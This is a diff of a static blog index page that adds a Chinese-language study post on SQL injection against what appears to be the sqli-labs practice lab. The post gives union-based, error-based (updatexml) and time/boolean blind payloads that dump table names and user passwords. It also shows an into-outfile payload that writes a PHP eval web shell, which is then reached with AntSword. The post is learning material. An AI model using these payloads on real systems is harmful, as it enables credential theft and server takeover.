@@ -71,6 +71,122 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql注入2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/02/23/sql%E6%B3%A8%E5%85%A52/" class="article-date">
+  <time class="dt-published" datetime="2026-02-23T05:49:01.000Z" itemprop="datePublished">2026-02-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/02/23/sql%E6%B3%A8%E5%85%A52/">sql注入2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>可以通过输入不符合sql语法的语句得到页面上返回的报错信息从而推断出要闭合什么符号</p>
+<p>例1</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/1.png" alt="1"></p>
+<p>输入id&#x3D;1”时页面返回报错信息</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/2.png" alt="2"></p>
+<p>由此推断出闭合方式，输入?id&#x3D;1”)--+</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/3.png" alt="3"></p>
+<p>第一步 判断共有几列    输入id&#x3D;1”) order by 4 --+时出现报错</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/4.png" alt="4"></p>
+<p>第二步 爆出显示位</p>
+<p>输入?id&#x3D;-1”) union select 1,2,3 --+</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/5.png" alt="5"></p>
+<p>第三步 爆出数据库和版本号</p>
+<p>输入?id&#x3D;-1”) union select 1,database(),version() --+</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/6.png" alt="6"></p>
+<p>第四步 爆表</p>
+<p>输入?id&#x3D;-1”) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’--+</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/7.png" alt="7"></p>
+<p>第五步 爆字段名</p>
+<p>输入?id&#x3D;-1”) union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/8.png" alt="8"></p>
+<p>第六步 得到敏感字段内容</p>
+<p>输入?id&#x3D;-1”) union select 1,2,group_concat(username,id,password) from users–+</p>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>updatexml()   </p>
+<p>sql语法：updatexml(1,concat(0x7e,(select databases())0x7e),1)</p>
+<p>如果存在注入则会出现报错，如：XPATH syntax error: <del>testdb</del></p>
+<p>可用于爆数据库名、爆表名、爆字段名</p>
+<p>例如：and updatexml(1,concat(0x7e,user(),0x7e),1)</p>
+<p>sleep()</p>
+<p>sql语法：sleep(seconds)</p>
+<p>作用：让数据库暂停指定秒数后再返回结果</p>
+<p>例如 select sleep(5);  查询会等待5秒，然后返回</p>
+<p>在sql注入中的作用：当页面没有回显，或没有报错，或没有明显变化就可以通过响应时间判断真假</p>
+<p>例如 and sleep(5)--+ 如果页面明显慢了5秒，则存在注入</p>
+<p>例2</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/9.png" alt="9"></p>
+<p>任意给id传一个值，发现结果不回显</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/10.png" alt="10"></p>
+<p>输入id&#x3D;1’制造语法错误</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/11.png" alt="11"></p>
+<p>发现语法报错存在，且可以判断出为单引号闭合</p>
+<p>输入?id&#x3D;1’ and sleep(5)–+   发现页面明显延迟，说明判断正确</p>
+<p>通过报错函数爆出数据库名</p>
+<p>输入?id&#x3D;-1’ and updatexml(1,concat(1,(database())),1)–+</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/12.png" alt="12"></p>
+<p>爆表</p>
+<p>输入?id&#x3D;-1’ and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)),1)–+</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/13.png" alt="13"></p>
+<p>爆字段名</p>
+<p>输入?id&#x3D;-1’ and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’)),1)–+</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/14.png" alt="14"></p>
+<h4 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h4><p>在sql注入中length函数常用于判断数据长度（用于盲注）</p>
+<p>时间盲注示例: and if(length(database())&#x3D;5,sleep(5),0)–+</p>
+<p>如果页面延迟5秒则数据库名长度是5</p>
+<p>布尔注入示例：and length(database())&#x3D;5 –+</p>
+<p>如果页面正确则数据库名长度是5</p>
+<h4 id="into-dumpfile"><a href="#into-dumpfile" class="headerlink" title="into dumpfile()"></a>into dumpfile()</h4><p>into dumpfile()是MYSQL的文件写入语法</p>
+<p>select ‘内容’ into dumpfile ‘&#x2F;路径&#x2F;文件名’;</p>
+<p>执行后在服务磁盘创建文件，把查询结果写进去</p>
+<p>特点：不会自动加换行，不会自动分隔字段，更适合写WebShell，可以写二进制</p>
+<h4 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile()"></a>into outfile()</h4><p>作用：把查询结果写入服务器上的一个文件（文件是在服务器本地创建）</p>
+<p>select ‘内容’ into outfile ‘&#x2F;路径&#x2F;文件名’;</p>
+<h4 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h4><p>作用：用来读取服务器本地文件的内容，并作为字符串返回</p>
+<p>select load_file(‘&#x2F;path&#x2F;file.txt’)</p>
+<p>读取的是服务器本机磁盘文件</p>
+<p>@@basedir()是安装MYSQL的安装路径，@@datadir()是安装MYSQL的数据文件路径</p>
+<p>例3</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/15.png" alt="15"></p>
+<p>制造sql语法错误，发现页面只显示对和错，输入?id&#x3D;1”时页面显示正常，输入?id&#x3D;1’时页面显示异常，初步判断为单引号闭合，输入?id&#x3D;1’–+发现页面显示还是异常，说明不是简单的单引号闭合，输入?id&#x3D;1’)–+发现页面还是异常，输入?id&#x3D;1’))–+,页面显示正常，说明闭合方式是单引号加两个括号</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/17.png" alt="17"></p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/16.png" alt="16"></p>
+<p>输入?id&#x3D;1’)) order by 1–+  直到4出现报错说明有三个字段</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/18.png" alt="18"></p>
+<p>通过into outfile函数写入一句话木马  输入?id&#x3D;1’)) union select 1,”&lt;?php eval($_REQUEST[1])?&gt;”,3 into outfile “D:&#x2F;&#x2F;phpstudy_pro&#x2F;&#x2F;WWW&#x2F;&#x2F;sqli-labs&#x2F;&#x2F;Less-7&#x2F;&#x2F;shell.php”–+（意思是把一句话木马shell.php写到服务器绝对路径中）</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/19.png" alt="19"></p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/20.png" alt="20"></p>
+<p>用蚁剑连接即可</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A52/21.png" alt="21"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/02/23/sql%E6%B3%A8%E5%85%A52/" data-id="cuidyusa7vKhc6bwJ8cY1WKAE" data-title="sql注入2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-sql注入1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/02/11/sql%E6%B3%A8%E5%85%A51/" class="article-date">
@@ -200,7 +316,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/02/11/sql%E6%B3%A8%E5%85%A51/" data-id="cuidBa-4lT5JHOw4CIK4ULKHL" data-title="sql注入1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/02/11/sql%E6%B3%A8%E5%85%A51/" data-id="cuidHyzHHzOu3v2ssnBIY5Ius" data-title="sql注入1" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -362,7 +478,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/02/02/%E6%95%B0%E6%8D%AE%E5%BA%931/" data-id="cuidh9mNWKaHK-vioxZuwpC-Z" data-title="数据库1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/02/02/%E6%95%B0%E6%8D%AE%E5%BA%931/" data-id="cuidSqdmmAkDh3gUuaUckXfpa" data-title="数据库1" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -470,7 +586,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/12/29/php3/" data-id="cuidPEF6QmQWp3Wt5RJU8pwel" data-title="php3" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/12/29/php3/" data-id="cuidAdDwylVYmNeyfoo-ydHpy" data-title="php3" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -571,7 +687,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/12/23/php2/" data-id="cuidRZMT3L9WP-_U0Eddw5eei" data-title="php2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/12/23/php2/" data-id="cuidHyHU_-bZ7A3V8p-7J4atv" data-title="php2" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -667,7 +783,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/12/16/php1/" data-id="cuidovj303kbaEWa73bk_EvMI" data-title="php1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/12/16/php1/" data-id="cuido3TbzQp4m_LYT5CJT4n1k" data-title="php1" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -745,7 +861,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/12/12/html/" data-id="cuidy7cYJbh3akKASxIMlhKau" data-title="html" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/12/12/html/" data-id="cuidw8FtxLIOFsmYeCKyIVqXq" data-title="html" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -811,7 +927,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/12/07/%E7%AC%AC%E5%9B%9B%E5%91%A8%E7%9A%84%E7%AC%94%E8%AE%B0/" data-id="cuidzesnhq_rswP7OyCo8U20v" data-title="第四周的笔记" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/12/07/%E7%AC%AC%E5%9B%9B%E5%91%A8%E7%9A%84%E7%AC%94%E8%AE%B0/" data-id="cuidkOfGtiRZ1meli7MiHx50Q" data-title="第四周的笔记" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -876,7 +992,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/11/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="cuidiGLiVfXmfPGPXC3pckd4-" data-title="文件上传漏洞" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/11/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="cuid0xAIDxLJXpl6Rrxi7Vc90" data-title="文件上传漏洞" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -940,54 +1056,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/11/15/post11-15-sql%E6%B3%A8%E5%85%A5/" data-id="cuidhRNY6Z1fM1th76lrzGiXT" data-title="post11.15(sql注入)" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-11-10-11-16" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/11/13/11-10-11-16/" class="article-date">
-  <time class="dt-published" datetime="2025-11-13T04:57:06.000Z" itemprop="datePublished">2025-11-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/11/13/11-10-11-16/">11.10-11.16</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>#笔记</p>
-<p>##11.12</p>
-<p>1 可在url后添加&#x2F;index.php.bak访问备份文件</p>
-<p>2 可在url后添加&#x2F;robots.txt以访问禁止访问的敏感路径(这些路径中往往包含一写敏感内容)</p>
-<p>3  phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替</p>
-<p>4 disabled 属性规定应该禁用的 input元素。被禁用的 input 元素是无法使用和无法点击的。</p>
-<p>5  php中有两种比较符号 &#x3D;&#x3D;&#x3D; 会同时比较字符串的值和类型 &#x3D;&#x3D; 会先将字符串换成相同类型，再作比较，属于弱类型比较</p>
-<p>6 php中的弱类型比较会使’abc’ &#x3D;&#x3D; 0为真（abc可换成任意字符）。</p>
-<p>7  php中is_numeric() 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE,且php中弱类型比较时，会使(‘1234a’ &#x3D;&#x3D; 1234)为真</p>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/11/13/11-10-11-16/" data-id="cuidKpMaQE1D2WXcqxhPIjJAK" data-title="11.10-11.16" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/11/15/post11-15-sql%E6%B3%A8%E5%85%A5/" data-id="cuidz9bclAjZV2uqTcCEGMR4a" data-title="post11.15(sql注入)" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1035,6 +1104,10 @@
       <ul>
         
           <li>
+            <a href="/2026/02/23/sql%E6%B3%A8%E5%85%A52/">sql注入2</a>
+          </li>
+        
+          <li>
             <a href="/2026/02/11/sql%E6%B3%A8%E5%85%A51/">sql注入1</a>
           </li>
         
@@ -1048,10 +1121,6 @@
         
           <li>
             <a href="/2025/12/23/php2/">php2</a>
-          </li>
-        
-          <li>
-            <a href="/2025/12/16/php1/">php1</a>
           </li>
         
       </ul>
